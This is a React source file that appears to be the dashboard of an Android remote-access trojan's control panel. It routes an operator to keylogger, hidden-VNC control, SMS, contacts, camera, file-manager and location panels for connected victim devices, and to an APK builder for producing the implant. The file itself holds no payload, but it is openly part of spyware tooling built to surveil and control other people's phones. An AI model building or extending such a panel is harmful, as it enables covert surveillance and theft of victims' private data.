import React, { useEffect, Suspense, lazy } from 'react';
import { useStore } from '../store/useStore';
import { connect, disconnect } from '../services/wsService';
import { Sidebar } from '../components/Sidebar';
import { DeviceList } from '../components/DeviceList';
import { DeviceControl } from './DeviceControl';
import { KeyloggerPanel } from '../components/KeyloggerPanel';
import { APKBuilder } from '../components/APKBuilder';
import { LocationMap } from '../components/LocationMap';
import { SmsPanel } from '../components/SmsPanel';
import type { ConnState } from '../services/wsService';
import type { NotifToast } from '../types';

/* ── Lazy loaded panels (code-split — loads only when navigated to) ── */
const FileManager   = lazy(() => import('../components/FileManager').then(m => ({ default: m.FileManager })));
const CameraPanel   = lazy(() => import('../components/CameraPanel'));
const ContactsPanel = lazy(() => import('../components/ContactsPanel').then(m => ({ default: m.ContactsPanel })));

/* ── Loading fallback ───────────────────────────────────────── */
const PanelLoader: React.FC = () => (
  <div className="flex-1 flex items-center justify-center h-full">
    <span className="text-[11px] text-slate-600 font-mono animate-pulse tracking-widest">LOADING...</span>
  </div>
);

/* ── No device selected ─────────────────────────────────────── */
const NoDevice: React.FC<{ section: string }> = ({ section }) => (
  <div className="flex-1 flex flex-col items-center justify-center h-full gap-3">
    <svg className="w-8 h-8 text-slate-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1} d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18h3" />
    </svg>
    <p className="text-[11px] text-slate-600 font-mono">
      Select a device to use <span className="text-slate-400">{section}</span>
    </p>
  </div>
);

/* ── Connection status bar ──────────────────────────────────── */
const ConnectionBar: React.FC = () => {
  const s = useStore((st) => st.connState);
  if (s === 'connected') return null;
  const cfg: Record<ConnState, string> = {
    idle:         'bg-slate-700',
    connecting:   'bg-amber-500 animate-pulse',
    connected:    '',
    reconnecting: 'bg-orange-500 animate-pulse',
  };
  return <div className={`h-0.5 w-full shrink-0 ${cfg[s]}`} />;
};

/* ── Toast stack ────────────────────────────────────────────── */
const ToastStack: React.FC = () => {
  const toasts      = useStore((s) => s.toasts);
  const removeToast = useStore((s) => s.removeToast);
  useEffect(() => {
    toasts.forEach((t) => {
      const tid = setTimeout(() => removeToast(t.id), t.duration ?? 4000);
      return () => clearTimeout(tid);
    });
  }, [toasts, removeToast]);

  const C: Record<NotifToast['type'], string> = {
    info:    'border-blue-700/50  bg-blue-950/90  text-blue-200',
    success: 'border-green-700/50 bg-green-950/90 text-green-200',
    warn:    'border-amber-700/50 bg-amber-950/90 text-amber-200',
    error:   'border-red-700/50   bg-red-950/90   text-red-200',
  };
  return (
    <div className="fixed bottom-4 right-4 z-50 flex flex-col gap-2 pointer-events-none max-w-xs">
      {toasts.map((t) => (
        <div key={t.id} className={`pointer-events-auto px-3 py-2 rounded border text-xs font-mono shadow-2xl backdrop-blur-sm ${C[t.type]}`}>
          {t.message}
        </div>
      ))}
    </div>
  );
};

/* ── Settings panel ─────────────────────────────────────────── */
const SettingsPanel: React.FC = () => {
  const logout    = useStore((s) => s.logout);
  const connState = useStore((s) => s.connState);
  const ping      = useStore((s) => s.serverPing);
  const devices   = useStore((s) => s.devices);
  const handleLogout = () => { disconnect(); logout(); };

  return (
    <div className="flex-1 p-6 space-y-4" style={{ fontFamily: 'var(--font-mono)' }}>
      <h2 className="text-xs font-semibold text-white/40 tracking-widest uppercase">Settings</h2>
      <div className="max-w-sm space-y-2">
        {([
          ['Status',   `${connState} · ${ping}ms`],
          ['Server',   (import.meta.env['VITE_WS_URL'] as string | undefined) ?? `${window.location.hostname}:3001`],
          ['Devices',  `${devices.filter(d => d.status === 'online').length} / ${devices.length}`],
        ] as [string, string][]).map(([k, v]) => (
          <div key={k} className="px-3 py-2.5 rounded border border-slate-800 bg-slate-900/40 flex items-center justify-between gap-4">
            <span className="text-[11px] text-slate-500 shrink-0">{k}</span>
            <span className="text-[11px] font-mono text-slate-300 truncate text-right">{v}</span>
          </div>
        ))}
        <button onClick={handleLogout} className="w-full mt-4 py-2 rounded border border-red-900/40 bg-red-950/20 text-red-400 text-xs font-mono hover:bg-red-950/40 transition-colors">
          DISCONNECT SESSION
        </button>
      </div>
    </div>
  );
};

/* ── Dashboard ──────────────────────────────────────────────── */
export const Dashboard: React.FC = () => {
  const token   = useStore((s) => s.auth.token);
  const section = useStore((s) => s.activeSection);
  const device  = useStore((s) => s.selectedDevice());

  useEffect(() => { if (token) connect(token); }, [token]);

  const renderMain = () => {
    switch (section) {
      case 'devices':
        return <DeviceList />;

      case 'hvnc':
      case 'control':
        return <DeviceControl />;

      case 'keylogger':
        return <KeyloggerPanel deviceId={device?.id} />;

      case 'location':
        return <LocationMap />;

      case 'sms':
        return device
          ? <SmsPanel deviceId={device.id} />
          : <NoDevice section="SMS" />;

      case 'contacts':
        return device
          ? <Suspense fallback={<PanelLoader />}><ContactsPanel deviceId={device.id} /></Suspense>
          : <NoDevice section="Contacts" />;

      case 'files':
        return device
          ? <Suspense fallback={<PanelLoader />}><FileManager deviceId={device.id} /></Suspense>
          : <NoDevice section="File Manager" />;

      case 'camera':
        return device
          ? <Suspense fallback={<PanelLoader />}><CameraPanel deviceId={device.id} /></Suspense>
          : <NoDevice section="Camera" />;

      case 'apk':
        return <APKBuilder />;

      case 'settings':
        return <SettingsPanel />;

      default:
        return <DeviceList />;
    }
  };

  return (
    <div className="flex flex-col h-screen bg-[#07090E] text-white overflow-hidden" style={{ fontFamily: 'var(--font-ui)' }}>
      <ConnectionBar />
      <div className="flex flex-1 overflow-hidden">
        <Sidebar />
        <main className="flex-1 flex flex-col overflow-hidden">
          {renderMain()}
        </main>
      </div>
      <ToastStack />
    </div>
  );
};
